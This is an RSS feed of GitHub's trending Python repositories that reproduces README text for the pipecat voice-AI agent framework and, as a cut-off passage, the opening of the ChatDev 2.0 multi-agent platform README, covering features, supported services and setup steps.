<rss version="2.0">
  <channel>
    <title>GitHub Python Daily Trending</title>
    <description>Daily Trending of Python in GitHub</description>
    <pubDate>Thu, 05 Feb 2026 01:44:53 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>pipecat-ai/pipecat</title>
      <link>https://github.com/pipecat-ai/pipecat</link>
      <description>&lt;p&gt;Open Source framework for voice and multimodal conversational AI&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;
 &lt;div align="center"&gt; 
  &lt;img alt="pipecat" width="300px" height="auto" src="https://raw.githubusercontent.com/pipecat-ai/pipecat/main/pipecat.png" /&gt; 
 &lt;/div&gt;&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://pypi.org/project/pipecat-ai"&gt;&lt;img src="https://img.shields.io/pypi/v/pipecat-ai" alt="PyPI" /&gt;&lt;/a&gt; &lt;img src="https://github.com/pipecat-ai/pipecat/actions/workflows/tests.yaml/badge.svg?sanitize=true" alt="Tests" /&gt; &lt;a href="https://codecov.io/gh/pipecat-ai/pipecat"&gt;&lt;img src="https://codecov.io/gh/pipecat-ai/pipecat/graph/badge.svg?token=LNVUIVO4Y9" alt="codecov" /&gt;&lt;/a&gt; &lt;a href="https://docs.pipecat.ai"&gt;&lt;img src="https://img.shields.io/badge/Documentation-blue" alt="Docs" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/pipecat"&gt;&lt;img src="https://img.shields.io/discord/1239284677165056021" alt="Discord" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/pipecat-ai/pipecat"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h1&gt;üéôÔ∏è Pipecat: Real-Time Voice &amp;amp; Multimodal AI Agents&lt;/h1&gt; 
&lt;p&gt;&lt;strong&gt;Pipecat&lt;/strong&gt; is an open-source Python framework for building real-time voice and multimodal conversational agents. Orchestrate audio and video, AI services, different transports, and conversation pipelines effortlessly‚Äîso you can focus on what makes your agent unique.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;Want to dive right in? Try the &lt;a href="https://docs.pipecat.ai/getting-started/quickstart"&gt;quickstart&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;üöÄ What You Can Build&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Voice Assistants&lt;/strong&gt; ‚Äì natural, streaming conversations with AI&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;AI Companions&lt;/strong&gt; ‚Äì coaches, meeting assistants, characters&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Multimodal Interfaces&lt;/strong&gt; ‚Äì voice, video, images, and more&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Interactive Storytelling&lt;/strong&gt; ‚Äì creative tools with generative media&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Business Agents&lt;/strong&gt; ‚Äì customer intake, support bots, guided flows&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Complex Dialog Systems&lt;/strong&gt; ‚Äì design logic with structured conversations&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üß† Why Pipecat?&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Voice-first&lt;/strong&gt;: Integrates speech recognition, text-to-speech, and conversation handling&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Pluggable&lt;/strong&gt;: Supports many AI services and tools&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Composable Pipelines&lt;/strong&gt;: Build complex behavior from modular components&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Real-Time&lt;/strong&gt;: Ultra-low latency interaction with different transports (e.g. WebSockets or WebRTC)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üåê Pipecat Ecosystem&lt;/h2&gt; 
&lt;h3&gt;üì± Client SDKs&lt;/h3&gt; 
&lt;p&gt;Building client applications? You can connect to Pipecat from any platform using our official SDKs:&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://docs.pipecat.ai/client/js/introduction"&gt;JavaScript&lt;/a&gt; | &lt;a href="https://docs.pipecat.ai/client/react/introduction"&gt;React&lt;/a&gt; | &lt;a href="https://docs.pipecat.ai/client/react-native/introduction"&gt;React Native&lt;/a&gt; | &lt;a href="https://docs.pipecat.ai/client/ios/introduction"&gt;Swift&lt;/a&gt; | &lt;a href="https://docs.pipecat.ai/client/android/introduction"&gt;Kotlin&lt;/a&gt; | &lt;a href="https://docs.pipecat.ai/client/c++/introduction"&gt;C++&lt;/a&gt; | &lt;a href="https://github.com/pipecat-ai/pipecat-esp32"&gt;ESP32&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;üß≠ Structured conversations&lt;/h3&gt; 
&lt;p&gt;Looking to build structured conversations? Check out &lt;a href="https://github.com/pipecat-ai/pipecat-flows"&gt;Pipecat Flows&lt;/a&gt; for managing complex conversational states and transitions.&lt;/p&gt; 
&lt;h3&gt;ü™Ñ Beautiful UIs&lt;/h3&gt; 
&lt;p&gt;Want to build beautiful and engaging experiences? Checkout the &lt;a href="https://github.com/pipecat-ai/voice-ui-kit"&gt;Voice UI Kit&lt;/a&gt;, a collection of components, hooks and templates for building voice AI applications quickly.&lt;/p&gt; 
&lt;h3&gt;üõ†Ô∏è Create and deploy projects&lt;/h3&gt; 
&lt;p&gt;Create a new project in under a minute with the &lt;a href="https://github.com/pipecat-ai/pipecat-cli"&gt;Pipecat CLI&lt;/a&gt;. Then use the CLI to monitor and deploy your agent to production.&lt;/p&gt; 
&lt;h3&gt;üîç Debugging&lt;/h3&gt; 
&lt;p&gt;Looking for help debugging your pipeline and processors? Check out &lt;a href="https://github.com/pipecat-ai/whisker"&gt;Whisker&lt;/a&gt;, a real-time Pipecat debugger.&lt;/p&gt; 
&lt;h3&gt;üñ•Ô∏è Terminal&lt;/h3&gt; 
&lt;p&gt;Love terminal applications? Check out &lt;a href="https://github.com/pipecat-ai/tail"&gt;Tail&lt;/a&gt;, a terminal dashboard for Pipecat.&lt;/p&gt; 
&lt;h3&gt;üì∫Ô∏è Pipecat TV Channel&lt;/h3&gt; 
&lt;p&gt;Catch new features, interviews, and how-tos on our &lt;a href="https://www.youtube.com/playlist?list=PLzU2zoMTQIHjqC3v4q2XVSR3hGSzwKFwH"&gt;Pipecat TV&lt;/a&gt; channel.&lt;/p&gt; 
&lt;h2&gt;üé¨ See it in action&lt;/h2&gt; 
&lt;p float="left"&gt; &lt;a href="https://github.com/pipecat-ai/pipecat-examples/tree/main/simple-chatbot"&gt;&lt;img src="https://raw.githubusercontent.com/pipecat-ai/pipecat-examples/main/simple-chatbot/image.png" width="400" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://github.com/pipecat-ai/pipecat-examples/tree/main/storytelling-chatbot"&gt;&lt;img src="https://raw.githubusercontent.com/pipecat-ai/pipecat-examples/main/storytelling-chatbot/image.png" width="400" /&gt;&lt;/a&gt; &lt;br /&gt; &lt;a href="https://github.com/pipecat-ai/pipecat-examples/tree/main/translation-chatbot"&gt;&lt;img src="https://raw.githubusercontent.com/pipecat-ai/pipecat-examples/main/translation-chatbot/image.png" width="400" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://github.com/pipecat-ai/pipecat/raw/main/examples/foundational/12-describe-video.py"&gt;&lt;img src="https://github.com/pipecat-ai/pipecat/raw/main/examples/foundational/assets/moondream.png" width="400" /&gt;&lt;/a&gt; &lt;/p&gt; 
&lt;h2&gt;üß© Available services&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Category&lt;/th&gt; 
   &lt;th&gt;Services&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Speech-to-Text&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/stt/assemblyai"&gt;AssemblyAI&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/aws"&gt;AWS&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/azure"&gt;Azure&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/cartesia"&gt;Cartesia&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/deepgram"&gt;Deepgram&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/elevenlabs"&gt;ElevenLabs&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/fal"&gt;Fal Wizper&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/gladia"&gt;Gladia&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/google"&gt;Google&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/gradium"&gt;Gradium&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/groq"&gt;Groq (Whisper)&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/hathora"&gt;Hathora&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/riva"&gt;NVIDIA Riva&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/openai"&gt;OpenAI (Whisper)&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/sambanova"&gt;SambaNova (Whisper)&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/sarvam"&gt;Sarvam&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/soniox"&gt;Soniox&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/speechmatics"&gt;Speechmatics&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/stt/whisper"&gt;Whisper&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;LLMs&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/llm/anthropic"&gt;Anthropic&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/aws"&gt;AWS&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/azure"&gt;Azure&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/cerebras"&gt;Cerebras&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/deepseek"&gt;DeepSeek&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/fireworks"&gt;Fireworks AI&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/gemini"&gt;Gemini&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/grok"&gt;Grok&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/groq"&gt;Groq&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/mistral"&gt;Mistral&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/nim"&gt;NVIDIA NIM&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/ollama"&gt;Ollama&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/openai"&gt;OpenAI&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/openrouter"&gt;OpenRouter&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/perplexity"&gt;Perplexity&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/qwen"&gt;Qwen&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/llm/sambanova"&gt;SambaNova&lt;/a&gt; &lt;a href="https://docs.pipecat.ai/server/services/llm/together"&gt;Together AI&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Text-to-Speech&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/tts/asyncai"&gt;Async&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/aws"&gt;AWS&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/azure"&gt;Azure&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/camb"&gt;Camb AI&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/cartesia"&gt;Cartesia&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/deepgram"&gt;Deepgram&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/elevenlabs"&gt;ElevenLabs&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/fish"&gt;Fish&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/google"&gt;Google&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/gradium"&gt;Gradium&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/groq"&gt;Groq&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/hathora"&gt;Hathora&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/hume"&gt;Hume&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/inworld"&gt;Inworld&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/lmnt"&gt;LMNT&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/minimax"&gt;MiniMax&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/neuphonic"&gt;Neuphonic&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/riva"&gt;NVIDIA Riva&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/openai"&gt;OpenAI&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/piper"&gt;Piper&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/playht"&gt;PlayHT&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/resemble"&gt;Resemble&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/rime"&gt;Rime&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/sarvam"&gt;Sarvam&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/speechmatics"&gt;Speechmatics&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/tts/xtts"&gt;XTTS&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Speech-to-Speech&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/s2s/aws"&gt;AWS Nova Sonic&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/s2s/gemini"&gt;Gemini Multimodal Live&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/s2s/grok"&gt;Grok Voice Agent&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/s2s/openai"&gt;OpenAI Realtime&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/s2s/ultravox"&gt;Ultravox&lt;/a&gt;,&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Transport&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/transport/daily"&gt;Daily (WebRTC)&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/transport/fastapi-websocket"&gt;FastAPI Websocket&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/transport/small-webrtc"&gt;SmallWebRTCTransport&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/transport/websocket-server"&gt;WebSocket Server&lt;/a&gt;, Local&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Serializers&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/utilities/serializers/exotel"&gt;Exotel&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/serializers/plivo"&gt;Plivo&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/serializers/twilio"&gt;Twilio&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/serializers/telnyx"&gt;Telnyx&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/serializers/vonage"&gt;Vonage&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Video&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/video/heygen"&gt;HeyGen&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/video/tavus"&gt;Tavus&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/video/simli"&gt;Simli&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Memory&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/memory/mem0"&gt;mem0&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Vision &amp;amp; Image&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/services/image-generation/fal"&gt;fal&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/image-generation/google-imagen"&gt;Google Imagen&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/vision/moondream"&gt;Moondream&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Audio Processing&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/utilities/audio/silero-vad-analyzer"&gt;Silero VAD&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/audio/krisp-filter"&gt;Krisp&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/audio/koala-filter"&gt;Koala&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/utilities/audio/aic-filter"&gt;ai-coustics&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Analytics &amp;amp; Metrics&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://docs.pipecat.ai/server/utilities/opentelemetry"&gt;OpenTelemetry&lt;/a&gt;, &lt;a href="https://docs.pipecat.ai/server/services/analytics/sentry"&gt;Sentry&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;üìö &lt;a href="https://docs.pipecat.ai/server/services/supported-services"&gt;View full services documentation ‚Üí&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‚ö° Getting started&lt;/h2&gt; 
&lt;p&gt;You can get started with Pipecat running on your local machine, then move your agent processes to the cloud when you're ready.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Install uv&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;curl -LsSf https://astral.sh/uv/install.sh | sh
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;&lt;strong&gt;Need help?&lt;/strong&gt; Refer to the &lt;a href="https://docs.astral.sh/uv/getting-started/installation/"&gt;uv install documentation&lt;/a&gt;.&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Install the module&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;# For new projects
uv init my-pipecat-app
cd my-pipecat-app
uv add pipecat-ai

# Or for existing projects
uv add pipecat-ai
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Set up your environment&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cp env.example .env
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;To keep things lightweight, only the core framework is included by default. If you need support for third-party AI services, you can add the necessary dependencies with:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv add "pipecat-ai[option,...]"
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Using pip?&lt;/strong&gt; You can still use &lt;code&gt;pip install pipecat-ai&lt;/code&gt; and &lt;code&gt;pip install "pipecat-ai[option,...]"&lt;/code&gt; to get set up.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;üß™ Code examples&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/pipecat-ai/pipecat/tree/main/examples/foundational"&gt;Foundational&lt;/a&gt; ‚Äî small snippets that build on each other, introducing one or two concepts at a time&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/pipecat-ai/pipecat-examples"&gt;Example apps&lt;/a&gt; ‚Äî complete applications that you can use as starting points for development&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üõ†Ô∏è Contributing to the framework&lt;/h2&gt; 
&lt;h3&gt;Prerequisites&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Minimum Python Version:&lt;/strong&gt; 3.10 &lt;strong&gt;Recommended Python Version:&lt;/strong&gt; 3.12&lt;/p&gt; 
&lt;h3&gt;Setup Steps&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;Clone the repository and navigate to it:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/pipecat-ai/pipecat.git
cd pipecat
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Install development and testing dependencies:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv sync --group dev --all-extras \
  --no-extra gstreamer \
  --no-extra krisp \
  --no-extra local \
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Install the git pre-commit hooks:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv run pre-commit install
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Some extras (local, gstreamer) require system dependencies. See documentation if you encounter build errors.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Running tests&lt;/h3&gt; 
&lt;p&gt;To run all tests, from the root directory:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;uv run pytest
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Run a specific test suite:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;uv run pytest tests/test_name.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;ü§ù Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, improving documentation, or adding new features, here's how you can help:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Found a bug?&lt;/strong&gt; Open an &lt;a href="https://github.com/pipecat-ai/pipecat/issues"&gt;issue&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Have a feature idea?&lt;/strong&gt; Start a &lt;a href="https://discord.gg/pipecat"&gt;discussion&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Want to contribute code?&lt;/strong&gt; Check our &lt;a href="https://raw.githubusercontent.com/pipecat-ai/pipecat/main/CONTRIBUTING.md"&gt;CONTRIBUTING.md&lt;/a&gt; guide&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Documentation improvements?&lt;/strong&gt; &lt;a href="https://github.com/pipecat-ai/docs"&gt;Docs&lt;/a&gt; PRs are always welcome&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Before submitting a pull request, please check existing issues and PRs to avoid duplicates.&lt;/p&gt; 
&lt;p&gt;We aim to review all contributions promptly and provide constructive feedback to help get your changes merged.&lt;/p&gt; 
&lt;h2&gt;üõü Getting help&lt;/h2&gt; 
&lt;p&gt;‚û°Ô∏è &lt;a href="https://discord.gg/pipecat"&gt;Join our Discord&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;‚û°Ô∏è &lt;a href="https://docs.pipecat.ai"&gt;Read the docs&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;‚û°Ô∏è &lt;a href="https://x.com/pipecat_ai"&gt;Reach us on X&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>OpenBMB/ChatDev</title>
      <link>https://github.com/OpenBMB/ChatDev</link>
      <description>&lt;p&gt;ChatDev 2.0: Dev All through LLM-powered Multi-Agent Collaboration&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ChatDev 2.0 - DevAll&lt;/h1&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/frontend/public/media/logo.png" alt="DevAll Logo" width="500" /&gt; &lt;/p&gt; 
&lt;p align="center"&gt; &lt;strong&gt;A Zero-Code Multi-Agent Platform for Developing Everything&lt;/strong&gt; &lt;/p&gt; 
&lt;p align="center"&gt; „Äê&lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README.md"&gt;English&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/README-zh.md"&gt;ÁÆÄ‰Ωì‰∏≠Êñá&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;p align="center"&gt; „Äêüìö &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developers&lt;/a&gt; | üë• &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#primary-contributors"&gt;Contributors&lt;/a&gt;ÔΩú‚≠êÔ∏è &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;ChatDev 1.0 (Legacy)&lt;/a&gt;„Äë &lt;/p&gt; 
&lt;h2&gt;üìñ Overview&lt;/h2&gt; 
&lt;p&gt;ChatDev has evolved from a specialized software development multi-agent system into a comprehensive multi-agent orchestration platform.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/main"&gt;&lt;strong&gt;ChatDev 2.0 (DevAll)&lt;/strong&gt;&lt;/a&gt; is a &lt;strong&gt;Zero-Code Multi-Agent Platform&lt;/strong&gt; for "Developing Everything". It empowers users to rapidly build and execute customized multi-agent systems through simple configuration. No coding is required‚Äîusers can define agents, workflows, and tasks to orchestrate complex scenarios such as data visualization, 3D generation, and deep research.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;strong&gt;ChatDev 1.0 (Legacy)&lt;/strong&gt;&lt;/a&gt; operates as a &lt;strong&gt;Virtual Software Company&lt;/strong&gt;. It utilizes various intelligent agents (e.g., CEO, CTO, Programmer) participating in specialized functional seminars to automate the entire software development life cycle‚Äîincluding designing, coding, testing, and documenting. It serves as the foundational paradigm for communicative agent collaboration.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üéâ News&lt;/h2&gt; 
&lt;p&gt;‚Ä¢ &lt;strong&gt;Jan 07, 2026: üöÄ We are excited to announce the official release of ChatDev 2.0 (DevAll)!&lt;/strong&gt; This version introduces a zero-code multi-agent orchestration platform. The classic ChatDev (v1.x) has been moved to the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;code&gt;chatdev1.0&lt;/code&gt;&lt;/a&gt; branch for maintenance. More details about ChatDev 2.0 can be found on &lt;a href="https://x.com/OpenBMB/status/2008916790399701335"&gt;our official post&lt;/a&gt;.&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;Old News&lt;/summary&gt; 
 &lt;p&gt;‚Ä¢Sep 24, 2025: üéâ Our paper &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt; has been accepted to NeurIPS 2025. The implementation is available in the &lt;code&gt;puppeteer&lt;/code&gt; branch of this repository.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢May 26, 2025: üéâ We propose a novel puppeteer-style paradigm for multi-agent collaboration among large language model based agents. By leveraging a learnable central orchestrator optimized with reinforcement learning, our method dynamically activates and sequences agents to construct efficient, context-aware reasoning paths. This approach not only improves reasoning quality but also reduces computational costs, enabling scalable and adaptable multi-agent cooperation in complex tasks. See our paper in &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/puppeteer.png" width="800" /&gt; &lt;/p&gt; 
